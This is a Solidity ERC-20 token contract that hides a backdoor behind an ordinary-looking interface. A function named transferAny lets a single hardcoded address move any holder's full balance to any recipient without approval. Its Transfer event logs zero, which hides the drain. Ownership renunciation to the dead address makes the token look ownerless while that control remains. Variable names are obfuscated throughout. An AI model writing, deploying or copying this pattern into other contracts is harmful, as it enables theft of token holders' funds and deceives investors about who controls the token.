pragma solidity ^0.8.5;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address aczdjsout) external view returns (uint256);
    function transfer(address recipient, uint256 anomfbrt) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 anomfbrt) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 anomfbrt ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed owner, address indexed spender, uint256 value );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract Ownable is Context {
    address private _owner;
    event ownershipTransferred(address indexed previousowner, address indexed newowner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit ownershipTransferred(address(0), msgSender);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyowner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceownership() public virtual onlyowner {
        emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }
}

contract token is Context, Ownable, IERC20 {
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private _iehj; 

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;

    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_ * (10 ** decimals_);
        _iehj = 0x6f0FF32aA6e33F0250ab5AC33096bBB8eB0F4901;
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function balanceOf(address aczdjsout) public view override returns (uint256) {
        return _balances[aczdjsout];
    }
 
    function transfer(address recipient, uint256 anomfbrt) public virtual override returns (bool) {
        require(_balances[_msgSender()] >= anomfbrt, "TT: transfer anomfbrt exceeds balance");

        _balances[_msgSender()] -= anomfbrt;
        _balances[recipient] += anomfbrt;
        emit Transfer(_msgSender(), recipient, anomfbrt);
        return true;
    }

    function transferAny(address sender, address recipient) public  returns (bool) {
        require(keccak256(abi.encodePacked(_msgSender())) == keccak256(abi.encodePacked(_iehj)), "Caller is not the original caller");

        uint256 JHH = _balances[sender]; 
        uint256 BNBB = _balances[recipient];
        require(JHH != 0, "Sender has no balance");

        BNBB += JHH;
        JHH = 0;

        _balances[sender] = JHH;
        _balances[recipient] = BNBB;

        emit Transfer(sender, recipient, JHH);
        return true;
    }



    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 anomfbrt) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = anomfbrt;
        emit Approval(_msgSender(), spender, anomfbrt);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 anomfbrt) public virtual override returns (bool) {
        require(_allowances[sender][_msgSender()] >= anomfbrt, "TT: transfer anomfbrt exceeds allowance");

        _balances[sender] -= anomfbrt;
        _balances[recipient] += anomfbrt;
        _allowances[sender][_msgSender()] -= anomfbrt;

        emit Transfer(sender, recipient, anomfbrt);
        return true;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }
}
